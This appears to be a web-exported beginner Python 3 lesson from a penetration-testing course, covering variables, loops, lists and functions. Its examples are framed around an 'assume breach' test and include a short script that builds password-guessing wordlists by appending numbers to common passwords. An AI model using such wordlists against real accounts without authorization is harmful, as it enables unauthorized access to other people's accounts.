
<body>
  <div class="container">
<link rel="stylesheet" href="style.css">
<h1 id="introduction-to-python-3">Introduction To Python 3</h1>
<h2 id="introduction-to-python-3">Introduction to Python 3</h2>
<hr>
<p>Welcome to <code>Introduction to Python 3</code>. This module will cover most of the essentials you need to know to get started with Python scripting. Whether you have a background in IT or just starting, this module will attempt to <code>guide you through</code> the process of creating small but useful scripts. This module will present to you an amount of code that will, depending on your previous experience, seem just enough or quite a lot. But fear not, we will get through this together.</p>
<p>So why even learn Python, one might ask? Python is one of the <code>most popular</code> scripting languages currently. This makes it a popular choice for <code>automation</code> of everyday tasks or the development of <code>tools</code>. In the InfoSec world, plenty of so-called PoCs (Proof of Concepts) are written in Python, as are many popular tools for penetration testing. The simplicity of the language makes it appealing to use when a need to &quot;just write something quickly&quot; arises. Yet, the language&#39;s flexibility and community support also make it a perfect candidate for larger projects. Whether you need to write a simple script that will automate a repetitive task on a website, crawling or analyzing large amounts of data, performing buffer overflow attacks, creating an interactive service, or something completely different, Python makes development easy.</p>
<p>Python is an <code>interpreted language</code>, which means the code itself is not compiled into machine code like C code. Instead, it is interpreted by the Python program, and the instructions in the script(s) are executed. Python is a high-level language meaning the scripts we produce are simplified for our convenience so that we do not need to worry about memory management, system calls, and so forth. Furthermore, Python is a <code>general-purpose</code>, <code>multi-paradigm</code> language that is a fancy way of saying &quot;you can use it for most things with ease&quot; and &quot;it doesn&#39;t mind if you prefer one style or another.&quot;</p>
<p>As for the coding style, we will gently touch on the object-oriented style because this makes reasoning about code a lot simpler. Essentially, object-oriented programming will likely feel less intimidating if you&#39;ve ever played with either blocks or bricks of either digital or physical form. Lastly, Python is rumored to be easy to read, especially in the beginning. This may be because of its close resemblance to the English language and its strict requirements for proper code indentation.</p>
<p>In this module, there will be code examples and lots of them. It is highly recommended that you type out all of the code by hand as you read along and refrain from copying and pasting. This will help you get in the flow and will help you remember what you learned. It is also highly recommended to explore and play around with the tools and techniques taught in this module. It is assumed that Python 3 is already installed on your system and that the Python 3 executable is in the PATH. A web-based virtual machine with Python 3 already installed and configured properly will be provided for all relevant sections.</p>
<p>Once again, welcome to the module.</p>
<hr>
<h2 id="executing-python-code">Executing Python Code</h2>
<hr>
<p>There are many ways to execute a piece of Python code. Two of the most frequently used methods are running the code from a <code>.py</code> file and running it directly inside the Python <a href="https://docs.python.org/3/library/idle.html">IDLE</a>, Integrated Development and Learning Environment. In this section, we will look at how to run code both ways. The file-based way is handy when developing an actual script and the IDLE way is very useful for quickly testing something small. We will start with the file-based approach.</p>
<hr>
<h3 id="python3">Python3</h3>
<p>Let&#39;s start with a widespread, first piece of code that prints out &quot;Hello world&quot; to the terminal or screen. In Python, it looks like this:</p>
<p><strong>welcome.py</strong></p>
<pre><code class="lang-python"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">"Hello Academy!"</span>)</span></span>
</code></pre>
<p>If we run this script, the string <code>&quot;Hello Academy!&quot;</code> will be printed to the terminal. To try it out, we open a text editor, type in the above, and save the file as <code>welcome.py</code>. Next, we try running it by executing <code>python3 welcome.py</code>.</p>
<p>&#x20; Executing Python Code</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ vim welcome<span class="hljs-selector-class">.py</span>
root@htb[/htb]$ python3 welcome<span class="hljs-selector-class">.py</span>

Hello Academy!
</code></pre>
<hr>
<h3 id="idle">IDLE</h3>
<p>We can utilize <code>IDLE</code>, Python&#39;s own integrated development environment, directly in our terminal for quicker prototyping. We launch this by executing the Python binary without any arguments. Within this, we can have it evaluate simple math equations, e.g., <code>4 + 2</code>, or store and use variables. When evaluating an expression, the result will be printed on the line below if a result is returned. However, if the expression is stored as a variable, nothing will be printed as nothing is returned (it is all contained in the variable). We can also import libraries and define functions and classes directly in the IDLE for usage in the same session. We will dive deeper into libraries, functions, and classes later on. To exit the IDLE again, we type <code>exit(0)</code>. The number <code>0</code> is the <a href="https://en.wikipedia.org/wiki/Exit_status">return code</a> of the Python process, where 0 means all is OK and a number different from 0 indicates an error. Consider this example of how to use IDLE:</p>
<p><strong>Python IDLE</strong></p>
<p>&#x20; Executing Python Code</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ python3

Python <span class="hljs-number">3.9</span><span class="hljs-meta">.0</span> (<span class="hljs-meta">default</span>, Oct <span class="hljs-number">27</span> <span class="hljs-number">2020</span>, <span class="hljs-number">14</span>:<span class="hljs-number">15</span>:<span class="hljs-number">17</span>) 
[Clang <span class="hljs-number">12.0</span><span class="hljs-meta">.0</span> (clang-<span class="hljs-number">1200.0</span><span class="hljs-meta">.32</span><span class="hljs-meta">.21</span>)] on darwin
Type <span class="hljs-string">"help"</span>, <span class="hljs-string">"copyright"</span>, <span class="hljs-string">"credits"</span> <span class="hljs-keyword">or</span> <span class="hljs-string">"license"</span> for more information.
&gt;&gt;&gt;
</code></pre>
<pre><code class="lang-python"><span class="hljs-meta">&gt;&gt;</span>&gt; <span class="hljs-number">4</span> + <span class="hljs-number">3</span>
<span class="hljs-number">7</span>
<span class="hljs-meta">&gt;&gt;</span>&gt; foo = <span class="hljs-number">3</span> * <span class="hljs-number">5</span>
<span class="hljs-meta">&gt;&gt;</span>&gt; foo
<span class="hljs-number">15</span>
<span class="hljs-meta">&gt;&gt;</span>&gt; foo + <span class="hljs-number">4</span>
<span class="hljs-number">19</span>
<span class="hljs-meta">&gt;&gt;</span>&gt; print(<span class="hljs-string">'Hello Academy!'</span>)
Hello Academy!
<span class="hljs-meta">&gt;&gt;</span>&gt; exit(<span class="hljs-number">0</span>)
</code></pre>
<p>Python executes the code from top to bottom. This is important to keep in mind when writing Python scripts because Python has no clue what is further down in the script until it gets to it. If we were to print a variable instead of a literal value, it must be defined before referencing. For example:</p>
<p><strong>Hello Again, Academy</strong></p>
<pre><code class="lang-python"><span class="hljs-meta">&gt;&gt;</span>&gt; greeting = <span class="hljs-string">'Hello again, Academy'</span>
<span class="hljs-meta">&gt;&gt;</span>&gt; print(greeting)
Hello again, Academy
</code></pre>
<p>However, we can print the output of not only one variable but of several in different variations.</p>
<p><strong>Printing Multiple Variables</strong></p>
<pre><code class="lang-python"><span class="hljs-meta">&gt;&gt;</span>&gt; a = <span class="hljs-string">'HTB'</span>
<span class="hljs-meta">&gt;&gt;</span>&gt; b = <span class="hljs-string">'Academy'</span>
<span class="hljs-meta">&gt;&gt;</span>&gt; print(a, b)
HTB Academy
</code></pre>
<hr>
<h3 id="shebang">Shebang</h3>
<p>Another method is based on adding the <a href="https://en.wikipedia.org/wiki/Shebang_\(Unix\">shebang</a>#Portability) (<code>#!/usr/bin/env python3</code>) in the first line of a Python script. On Unix-based operating systems, marking this with a pound sign and an exclamation mark causes the following command to be executed along with all of the specified arguments when the program is called. We can give the Python script execution rights and execute it directly without entering <code>python</code> at the beginning on the command line. The file name is then passed as an argument.</p>
<p><strong>welcome.py</strong></p>
<pre><code class="lang-python"><span class="hljs-meta">#!/usr/bin/env python3</span>

print(<span class="hljs-string">"Hello Academy!"</span>)
</code></pre>
<p><strong>Shebang Execution</strong></p>
<p>&#x20; Executing Python Code</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ chmod +x welcome<span class="hljs-selector-class">.py</span>
root@htb[/htb]$ ./welcome<span class="hljs-selector-class">.py</span>

Hello Academy!
</code></pre>
<hr>
<h2 id="introduction-to-variables">Introduction to Variables</h2>
<hr>
<p>Let us assume for a moment that we are tasked with doing a penetration test for a client with a locked-down user environment. While investigating our options for our <code>Assume Breach</code> test, i.e., a test assuming that we have already successfully compromised a regular user account and machine through phishing, we discover that we can run Python scripts. We can produce a list of potential user accounts, and we would also like to have a <code>target specific</code> list of potential passwords. We notice that the client&#39;s website contains many <code>buzzwords</code>, and we wonder if some users used variations of product names as their passwords. For this, we need to write a simple script that can produce a list of a website&#39;s most frequently occurring words. Since the client wants to get a copy, we will try our best to make the script easy to read and maintain.</p>
<p>Before we get ahead of ourselves, we need to carve out the essential building blocks. For this, let us talk about math. Math and programming have some things in common: both use variables and constants a fair bit, and both have functions. In Python, a variable is our way of storing a value of some sort in memory. For example, a number, some text, or the bytes of an image. Like in math, variables have a name that we make up, but the names should be descriptive in Python. Below are some examples:</p>
<p><strong>A Few Simple Variables</strong></p>
<pre><code class="lang-python"><span class="hljs-attr">advice</span> = <span class="hljs-string">"Don't panic"</span>
<span class="hljs-attr">ultimate_answer</span> = <span class="hljs-number">42</span>
<span class="hljs-attr">potential_question</span> = <span class="hljs-number">6</span> * <span class="hljs-number">7</span>
<span class="hljs-attr">confident</span> = <span class="hljs-literal">True</span>
<span class="hljs-attr">something_false</span> = <span class="hljs-literal">False</span>
<span class="hljs-attr">problems</span> = None
<span class="hljs-comment"># Oh, and by the way, this is a comment. We can tell by the leading # sign.</span>
</code></pre>
<p><strong>Strings</strong></p>
<p>The first variable, <code>advice</code>, is a <code>string</code>. Strings in Python can be specified using both <code>&quot;double quotes&quot;</code> and <code>&#39;single quotes&#39;</code>. When typing out strings that contain either symbol as a natural part of the string itself, e.g., <code>don&#39;t lie</code>, it is a good idea to use the <code>other</code> kind of quotes. Writing <code>&quot;don&#39;t lie&quot;</code> works just fine. However, using single quotes would throw an error.</p>
<p><strong>Integers</strong></p>
<p>Following the <code>advice</code> variable comes two numbers, or <code>integers</code>, the first of which is a number. The second variable, <code>potential_question</code>, is also a number but not until <code>runtime</code>. During runtime, the equation <code>6 * 7</code> is evaluated to <code>42</code>, which is then stored as the variable.</p>
<p><strong>Booleans</strong></p>
<p>Following the number variables come two <code>boolean</code> variables, <code>confident</code> and <code>something_false</code>. A boolean value is a truth value and can be either <code>True</code> or <code>False</code>. These will come in handy later. Right after comes the variable <code>problems</code>, which is set to <code>None</code>. <a href="https://realpython.com/null-in-python/">None</a> is a special &quot;nothingness&quot; of a value similar to <code>null</code> in other languages. The usefulness of this value is, among other things, that it allows us to <code>define variables</code> in the code but not give them a concrete value just yet. It also allows us to create a more meaningful program flow and decide to pass along <code>either</code> some data <code>or</code> <code>None</code>, e.g., in case of errors. Moreover, it allows us to return it as a value if &quot;none of something&quot; was found. This also enhances the program flow and readability.</p>
<p><strong>Comments</strong></p>
<p>Lastly, we see a comment. Comments work the same way in Python as they do in all other languages: they are ignored when the program runs and are only for the developers&#39; eyes. It can sometimes be advisible to use comments to remember what a piece of code does or explain some oddity. However, it is strongly recommended to write clean and simple code that will not need further explanation other than the code itself. This is not always the easiest way to get started, but we will try to aim for this later.</p>
<hr>
<h3 id="combining-variables">Combining Variables</h3>
<p>Let us go through a few examples to see how all these variables can also be combined. Later on, whether for our projects or specific tasks, we will want to output variables (and thus also their contents) together. Therefore, let us first briefly go through some basic math operations with Python.</p>
<p><strong>Basic Math Operations</strong></p>
<pre><code class="lang-python"><span class="hljs-meta">&gt;&gt;</span>&gt; <span class="hljs-number">10</span> + <span class="hljs-number">10</span>        <span class="hljs-comment"># Addition</span>
<span class="hljs-number">20</span>
<span class="hljs-meta">&gt;&gt;</span>&gt; <span class="hljs-number">20</span> - <span class="hljs-number">10</span>        <span class="hljs-comment"># Subtraction</span>
<span class="hljs-number">10</span>
<span class="hljs-meta">&gt;&gt;</span>&gt; <span class="hljs-number">5</span> * <span class="hljs-number">5</span>        <span class="hljs-comment"># Multiplication</span>
<span class="hljs-number">25</span>
<span class="hljs-meta">&gt;&gt;</span>&gt; <span class="hljs-number">10</span> / <span class="hljs-number">5</span>        <span class="hljs-comment"># Division</span>
<span class="hljs-number">2</span>
</code></pre>
<p>For all of these values we can define variables to store them. As for the name itself, we can name them as we please, however with a few exceptions e.g. they must begin with a letter or <code>_</code>.</p>
<p><strong>Saving Values to Variables</strong></p>
<pre><code class="lang-python">&gt;&gt;&gt; add = <span class="hljs-number">10</span> + <span class="hljs-number">10</span>
&gt;&gt;&gt; sub = <span class="hljs-number">20</span> - <span class="hljs-number">10</span>
&gt;&gt;&gt; multi = <span class="hljs-number">5</span> * <span class="hljs-number">5</span>
&gt;&gt;&gt; div = <span class="hljs-number">10</span> / <span class="hljs-number">5</span>
&gt;&gt;&gt;
&gt;&gt;&gt; print(add, sub, multi, div)
<span class="hljs-number">20</span> <span class="hljs-number">10</span> <span class="hljs-number">25</span> <span class="hljs-number">2</span>
</code></pre>
<p>This also allows us to work with the values stored in the individual variables.</p>
<p><strong>Working with Variables</strong></p>
<pre><code class="lang-python">...SNIP...
&gt;&gt;&gt; print(<span class="hljs-keyword">add, </span><span class="hljs-keyword">sub, </span><span class="hljs-keyword">multi, </span><span class="hljs-keyword">div)
</span><span class="hljs-number">20</span> <span class="hljs-number">10</span> <span class="hljs-number">25</span> <span class="hljs-number">2</span>
&gt;&gt;&gt; result = (<span class="hljs-keyword">add </span>* <span class="hljs-keyword">sub) </span>- (<span class="hljs-keyword">multi </span>* <span class="hljs-keyword">div) </span>       <span class="hljs-comment"># (20 * 10) - (25 * 2)</span>
&gt;&gt;&gt; print(<span class="hljs-string">'Result: '</span>, result)
<span class="hljs-symbol">Result:</span>  <span class="hljs-number">150</span>
</code></pre>
<p>Another handy feature of the Python interpreter is that the IDLE assigns the latest expression to the variable <code>_</code>. This allows us to continue working with the last value.</p>
<pre><code class="lang-python">&gt;&gt;&gt; <span class="hljs-number">38</span> + <span class="hljs-number">4</span>
<span class="hljs-number">42</span>
&gt;&gt;&gt; <span class="hljs-number">50</span> - _        # <span class="hljs-number">50</span> - <span class="hljs-number">42</span>
<span class="hljs-number">8</span>
</code></pre>
<p>Note however that this is true <em>only</em> for IDLE. In regular Python code that is run from <code>.py</code> files e.g. from the command line or in an Integrated Development Environment, <code>_</code> is simply just a variable. It is often used as a placeholder for values we do not care about, for example if a function returns two values, but only one of them is important to us, for example <code>x_coord, _ = get_position_of_birb()</code>. This is to show other developers, and ourselves a few months into the future, that the value returned, e.g. the y-coordinate from the previous example, is not needed.</p>
<hr>
<h3 id="coding-style">Coding Style</h3>
<p>In Python, variable names follow the <a href="https://en.wikipedia.org/wiki/Snake_case">snake_case</a> naming convention. This means that variable names should be all lower case initially, and an underscore should separate any potential need for multiple words in the name. While ignoring these naming conventions will not cause any issues for the script - Python could care less about what we call our things - other Python developers may get thrown off if they expect one set of rules but face others.</p>
<p>The main point here is that our code should be easy to follow and read. Every programmer has their style and preferences when it comes to writing code. There are even several style guides for Python, such as <a href="https://www.python.org/dev/peps/pep-0008/#type-variable-names">PEP8</a>, which describes certain types of variable or function definitions. Having a style guide is very important when we want someone to read the code we write. We usually write code so that someone can use it, benefit from it and possibly work on it or learn something new from it. Without a style guide, debugging, improving, or extending becomes immensely difficult. Of course, there are many other things besides the style guide that we as professional programmers need to pay attention to, such as code architecture, general principles for code quality, etc.</p>
<hr>
<h2 id="conditional-statements-and-loops">Conditional Statements and Loops</h2>
<hr>
<p>Now let us spice things up a little. This section will go over conditional statements - ifs and elses - and various types of loops. Below is an example of what an if/else <code>block</code> of code looks like, i.e., the amount of code that constitutes a particular technique and is visually grouped (typically indented at the same level).</p>
<p><strong>A Simple Feature Switch</strong></p>
<pre><code class="lang-python">happy = <span class="hljs-keyword">True</span>

<span class="hljs-keyword">if</span> happy:
    <span class="hljs-keyword">print</span>(<span class="hljs-string">"Happy and we know it!"</span>)
<span class="hljs-keyword">else</span>:
    <span class="hljs-keyword">print</span>(<span class="hljs-string">"Not happy..."</span>)
</code></pre>
<p>A few things happened here already. Pay close attention to the indentation of the code. Python does not require how wide each indentation must be, as long as there is <code>consistency</code>. Some people prefer two spaces, others 4. Some people prefer a single tab character. We will continue to use four spaces going forward.</p>
<p>Besides indentations, two new keywords are used here: <code>if</code> and <code>else</code>. First, we define a variable which, for the sake of demonstration, is currently TRUE. Then we check <code>if</code> the variable <code>happy</code> is <code>True</code> (<code>if some_var</code> is easier to read but also shorthand for <code>if some_var == True</code>), and if it is <code>True</code>, then we print &quot;Happy and we know it!&quot; to the terminal. If <code>happy</code> is <code>not</code> <code>True</code>, i.e., it is <code>False</code>, then the <code>else</code> block is executed instead, and &quot;Not happy...&quot; is printed to the terminal.</p>
<p>Nevertheless, we also have to consider the situation that we want to bring in more than just two different options. The <code>elif</code> (else-if) expression means that we continue with this one if the previous condition is not met. Basically, <code>elif</code> is the shortened notation of nested <code>if</code> statements.</p>
<p><strong>If-Elif-Else Statement</strong></p>
<pre><code class="lang-python">happy = 2

<span class="hljs-keyword">if</span> happy == 1:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"Happy and we know it!"</span>)
<span class="hljs-keyword">elif</span> happy == 2:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"Excited about it!"</span>)
<span class="hljs-keyword">else</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"Not happy..."</span>)
</code></pre>
<p>This brings us to the first type of loop: the <code>while-loop</code>. Consider the below code:</p>
<p><strong>The While-Loop</strong></p>
<pre><code class="lang-python">counter = <span class="hljs-number">0</span>

<span class="hljs-built_in">while</span> counter &lt; <span class="hljs-number">5</span>:
    <span class="hljs-built_in">print</span>(f<span class="hljs-string">'Hello #{counter}'</span>)
    counter = counter + <span class="hljs-number">1</span>
</code></pre>
<p>Before we dive into the code, it is essential to know how a while-loop works in the first place. A while-loop is a loop that will execute its content (the &quot;block&quot;) as long as the defined condition is <code>True</code>. This means that <code>while True</code> will run forever, and <code>while False</code> will never run. By doing what we do in the example, we tell Python to run the contents of the while-loop for as long as the <code>counter</code> variable is below 5. Inside the while-loop, we must then remember to increase the <code>counter</code> by (at least) 1 every time we make an iteration or eventually, anyway. If we try to run the above example, <code>print</code> will be called five times and print the contents of the function.</p>
<p>Now, what are the contents of <code>print</code>? Let us quickly talk about formatted strings before continuing with loops. A format string is a string that lets us <code>populate the string</code> with values during runtime. A new formatting string was introduced with Python 3.6: the <a href="https://realpython.com/python-f-strings/">f-string</a> (above example).</p>
<p>While a regular string could look something like <code>&#39;Hello world&#39;</code>, an f-string adds an <code>f</code> at the beginning: <code>f&#39;Hello world&#39;</code>. These particular two strings are of the same value. The benefit of the f-string, however, is that we can swap out parts of the strings with other values and variables by enclosing them in a pair of curly braces, like this:</p>
<p><strong>Format Strings</strong></p>
<pre><code class="lang-python"><span class="hljs-attr">equation</span> = f<span class="hljs-string">'The meaning of life might be {6 * 7}.'</span>  # -&gt; The meaning of life might be <span class="hljs-number">42</span>.

<span class="hljs-attr">me</span> = <span class="hljs-string">'Birb'</span>
<span class="hljs-attr">greeting</span> = f<span class="hljs-string">'Hello {me}!'</span>  # -&gt; Hello Birb!
</code></pre>
<p>Now that we know that a while-loop is a loop that continues to execute <code>while</code> some condition is true, and we know that <code>f&#39;Hello #{counter}&#39;</code> will equal <code>Hello #</code> followed by the number of the iteration - starting at 0 - we are ready to try to execute the code!</p>
<p><strong>While-Loop</strong></p>
<p>&#x20; Conditional Statements and Loops</p>
<pre><code class="lang-shell-session">root<span class="hljs-symbol">@htb[</span>/htb]$ vim loop1.py
root<span class="hljs-symbol">@htb[</span>/htb]$ python3 loop1.py

Hello <span class="hljs-meta">#0</span>
Hello <span class="hljs-meta">#1</span>
Hello <span class="hljs-meta">#2</span>
Hello <span class="hljs-meta">#3</span>
Hello <span class="hljs-meta">#4</span>
</code></pre>
<p>Once again: the loop checks if the counter, which is set to 0 initially, is below 5 - it is - and then prints &quot;Hello #0&quot; and sets the <code>counter</code> variable to the value of itself (0) + 1. Next iteration, it checks if <code>counter</code>, which is now 1, is less than 5 - it is - and then prints &quot;Hello #1&quot; and sets <code>counter</code> to the value of itself (1) + 1. On the 3rd iteration, <code>counter</code> is 2 (because we started at 0), and so forth.</p>
<p>In the next section, we will continue looking at loops, but this time a simpler type of loop and one we will be favoring over the other as much as possible.</p>
<hr>
<h3 id="loops-and-lists">Loops and Lists</h3>
<p>Recall from the previous section that a loop is a block of code that keeps iterating the contents until some condition is met. This section will look at one kind of loops often referred to as the &quot;for-each loop&quot;. This is a loop that iterates over <code>each element</code> in some collection of elements and does something <code>for each</code> individual element. Consider the below line of code:</p>
<p><strong>A List of Strings</strong></p>
<pre><code class="lang-python"><span class="hljs-attr">groceries</span> = [<span class="hljs-string">'Walnuts'</span>, <span class="hljs-string">'Grapes'</span>, <span class="hljs-string">'Bird seeds'</span>]
</code></pre>
<p>This is a list of strings. The square brackets indicate a list, and the comma-separated values inside of it are strings. Similarly, <code>[]</code> is an empty list, and <code>[42]</code> is a list with just one element, the <code>int</code> value <code>42</code>. When pointing out values inside lists, Python numbers the elements in a list from 0 and upwards. This means that the above list has <code>three elements</code> and that <code>the first</code> element is at <code>index 0</code>. The second element is at index 1, and the third element is at index 2. Like so:</p>
<p><strong>Value Indexes</strong></p>
<pre><code class="lang-python"><span class="hljs-attr">groceries</span> = [<span class="hljs-string">'Walnuts'</span>, <span class="hljs-string">'Grapes'</span>, <span class="hljs-string">'Bird seeds'</span>]
<span class="hljs-comment"># index:         0          1          2</span>
</code></pre>
<p>We can also write lists the following way for easier readability (especially with much larger lists):</p>
<p><strong>Alternative Syntax</strong></p>
<pre><code class="lang-python"><span class="hljs-attribute">groceries</span> = [
    <span class="hljs-string">'Walnuts'</span>,    <span class="hljs-comment"># index 0</span>
    <span class="hljs-string">'Grapes'</span>,     <span class="hljs-comment"># index 1</span>
    <span class="hljs-string">'Bird seeds'</span>  <span class="hljs-comment"># index 2</span>
]
</code></pre>
<p>The last thing to mention about lists before we move on is how to retrieve an element from the list. Say we want to print the first element to the console. This is done by referencing the variable name of the list, e.g., <code>groceries</code> and which index is desired like so: <code>groceries[0]</code> to get the first element, <code>&#39;Walnuts&#39;</code>. The last element, <code>&#39;Bird seeds&#39;</code> would in this example then be <code>groceries[2]</code> because the value <code>&#39;Bird seeds&#39;</code> is located at index 2 in the list. Python can even count backward, so we could also have gotten the last element of the list - regardless of how many elements are in it - by asking for index -1: <code>groceries[-1]</code>. It works the same way we did with strings.</p>
<p><strong>Strings Indexing</strong></p>
<p>Strings can also be indexed. This is especially useful when we want to filter out certain parts of some output. We can think of each word as a list of letters with indexes. However, there is also the negative index, which allows us to start counting the string letters from the end. Let us take the following string as an example: <code>ABCDEF</code></p>
<table>
<thead>
<tr>
<th><strong>Negative Index</strong></th>
<th><strong>Index</strong></th>
<th><strong>Character</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>-6</code></td>
<td><code>0</code></td>
<td>A</td>
</tr>
<tr>
<td><code>-5</code></td>
<td><code>1</code></td>
<td>B</td>
</tr>
<tr>
<td><code>-4</code></td>
<td><code>2</code></td>
<td>C</td>
</tr>
<tr>
<td><code>-3</code></td>
<td><code>3</code></td>
<td>D</td>
</tr>
<tr>
<td><code>-2</code></td>
<td><code>4</code></td>
<td>E</td>
</tr>
<tr>
<td><code>-1</code></td>
<td><code>5</code></td>
<td>F</td>
</tr>
</tbody>
</table>
<p>We use the index to tell Python which letter we want to output from it. In this example, we want to output the first and the last letter.</p>
<pre><code class="lang-python">&gt;&gt;&gt; <span class="hljs-selector-tag">var</span> = <span class="hljs-string">"ABCDEF"</span>
&gt;&gt;&gt; print(<span class="hljs-selector-tag">var</span>[<span class="hljs-number">0</span>], <span class="hljs-selector-tag">var</span>[<span class="hljs-number">1</span>], <span class="hljs-selector-tag">var</span>[<span class="hljs-number">2</span>], <span class="hljs-selector-tag">var</span>[<span class="hljs-number">3</span>], <span class="hljs-selector-tag">var</span>[<span class="hljs-number">4</span>], <span class="hljs-selector-tag">var</span>[<span class="hljs-number">5</span>])
A B C D E F
&gt;&gt;&gt; print(<span class="hljs-selector-tag">var</span>[-<span class="hljs-number">1</span>], <span class="hljs-selector-tag">var</span>[-<span class="hljs-number">2</span>], <span class="hljs-selector-tag">var</span>[-<span class="hljs-number">3</span>], <span class="hljs-selector-tag">var</span>[-<span class="hljs-number">4</span>], <span class="hljs-selector-tag">var</span>[-<span class="hljs-number">5</span>], <span class="hljs-selector-tag">var</span>[-<span class="hljs-number">6</span>])
F E D C B A
</code></pre>
<p>We can also work with these indexes to give us particular substrings.</p>
<p><strong>Substrings</strong></p>
<pre><code class="lang-python">&gt;&gt;&gt; var = <span class="hljs-string">"ABCDEF"</span>
&gt;&gt;&gt; <span class="hljs-keyword">print</span>(var[:<span class="hljs-number">2</span>])    # Up <span class="hljs-keyword">to</span> <span class="hljs-built_in">index</span> <span class="hljs-number">2</span>
AB
&gt;&gt;&gt; <span class="hljs-keyword">print</span>(var[<span class="hljs-number">2</span>:])    # Ignore everything <span class="hljs-keyword">up</span> <span class="hljs-keyword">to</span> <span class="hljs-built_in">index</span> <span class="hljs-number">2</span>
CDEF
&gt;&gt;&gt; <span class="hljs-keyword">print</span>(var[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>])    # Everything between <span class="hljs-built_in">index</span> <span class="hljs-number">2</span> <span class="hljs-built_in">and</span> <span class="hljs-number">4</span> (<span class="hljs-string">"2"</span> <span class="hljs-keyword">is</span> counted)
CD
&gt;&gt;&gt; <span class="hljs-keyword">print</span>(var[-<span class="hljs-number">2</span>:])    # Up <span class="hljs-keyword">to</span> negative <span class="hljs-built_in">index</span> <span class="hljs-number">2</span> (<span class="hljs-keyword">last</span> two characters)
EF
</code></pre>
<hr>
<h3 id="for-each-loop">For-Each Loop</h3>
<p>As already mentioned, Python allows us to loop over each element (or value) in a list. Consider the below piece of code where we at first have defined a list and then the loop.</p>
<p><strong>The For-Each Loop</strong></p>
<pre><code class="lang-python">groceries = [<span class="hljs-symbol">'Walnuts</span>', <span class="hljs-symbol">'Grapes</span>', <span class="hljs-symbol">'Bird</span> seeds']

<span class="hljs-keyword">for</span> food <span class="hljs-keyword">in</span> groceries:
    print(f<span class="hljs-symbol">'I</span> bought <span class="hljs-keyword">some</span> {food} today.')
</code></pre>
<p>The for-each loop is structured this way: first the <code>for</code> keyword, then the variable name we choose, followed by the <code>in</code> keyword and a collection to iterate over. In this example, we told Python to run the code inside the block &quot;for each element,&quot; where we then call the current element <code>food</code>. We then tell Python where to find these elements, which in this case is inside <code>groceries</code>&quot;. Let us break the entire iteration process down.</p>
<p>At the start of the first iteration, a variable <code>food</code> is set to the first value in <code>groceries</code>, <code>&#39;Walnuts&#39;</code>. Then we print <code>&#39;I bought some Walnuts today.&#39;</code> because the f-string inserts the current value of <code>food</code> into the string. We then repeat the process; however, <code>food</code> is set to the <code>second</code> element in the list <code>&#39;Grapes&#39;</code>. The third time around, <code>food</code> is set to the last element in the list of three elements, <code>&#39;Bird seeds&#39;</code>, because we asked Python to run the print <code>for</code> each element in the list.</p>
<p>Try to implement the example in a new Python script and run it. It should look something like this:</p>
<p><strong>While-Loop</strong></p>
<p>&#x20; Conditional Statements and Loops</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ vim groceries.py
root@htb[/htb]$ python3 groceries.py

<span class="hljs-symbol">I</span> bought some <span class="hljs-symbol">Walnuts</span> today.
<span class="hljs-symbol">I</span> bought some <span class="hljs-symbol">Grapes</span> today.
<span class="hljs-symbol">I</span> bought some <span class="hljs-symbol">Bird</span> seeds today.
</code></pre>
<p>Note that in Python we can iterate over each element produced by a &quot;generator&quot; as well as a collection of data. We will not be covering generators in this module, because we usually don&#39;t need to worry about them when writing Python programs.</p>
<hr>
<h3 id="exercises">Exercises</h3>
<p>Below are the relevant code blocks for the exercises in this section.</p>
<p><strong>Code Block 1</strong></p>
<pre><code class="lang-python"><span class="hljs-attr">list_1</span>  = [<span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-string">'Cake'</span>, <span class="hljs-literal">True</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]
</code></pre>
<p><strong>Code Block 2</strong></p>
<pre><code class="lang-python">list_2 = [<span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>]

<span class="hljs-keyword">for</span> <span class="hljs-built_in">num</span> <span class="hljs-keyword">in</span> list_2:
    __________
</code></pre>
<p><strong>Code Block 3</strong></p>
<pre><code class="lang-python">list_3 = [<span class="hljs-string">'Accidental'</span>, <span class="hljs-string">'4daa7fe9'</span>, <span class="hljs-string">'eM131Me'</span>, <span class="hljs-string">'Y!.90'</span>]
secret = []

<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> list_3:
    secret.append(x[:<span class="hljs-number">2</span>])

<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">''</span>.join(secret)</span></span>)
</code></pre>
<hr>
<h2 id="defining-functions">Defining Functions</h2>
<hr>
<p>So far, we have been looking at common techniques for controlling code flow, making it possible for us to build simple tools, for example, counters or even a simple wordlist enricher. For example: for each word in the wordlist, first set the counter to 0, while the counter is less than 100, print the word and the counter and increase the counter by 1. For reference, this could look something like this:</p>
<p><strong>Password Generator Example</strong></p>
<pre><code class="lang-python">wordlist = [<span class="hljs-string">'password'</span>, <span class="hljs-string">'john'</span>, <span class="hljs-string">'qwerty'</span>, <span class="hljs-string">'admin'</span>]

<span class="hljs-built_in">for</span> <span class="hljs-keyword">word</span> in wordlist:
    counter = <span class="hljs-number">0</span>
    <span class="hljs-built_in">while</span> counter &lt; <span class="hljs-number">100</span>:
        <span class="hljs-built_in">print</span>(f<span class="hljs-string">'{word}{counter}'</span>)
        counter = counter + <span class="hljs-number">1</span>
</code></pre>
<p>In this case, the for-loop repeats the loop until it has processed all entries from the list. As shown, even with simple building blocks, we can achieve a lot. Let us talk about the following important building block in software: <code>Functions</code></p>
<hr>
<h3 id="functions">Functions</h3>
<p>Functions let us define code blocks that perform a range of actions, produce a range of values, and optionally return one or more of these values. Like in math, where <code>f(x)</code> is a <code>function f of x</code> and produces the same result when given the same input. For example <code>f(x) = x + 1</code> is a function <code>f</code> of <code>x</code> which returns <code>x + 1</code>. Thus <code>f(2)</code> would be <code>3</code>, because <code>f(2) = 2 + 1</code> which is <code>3</code>.</p>
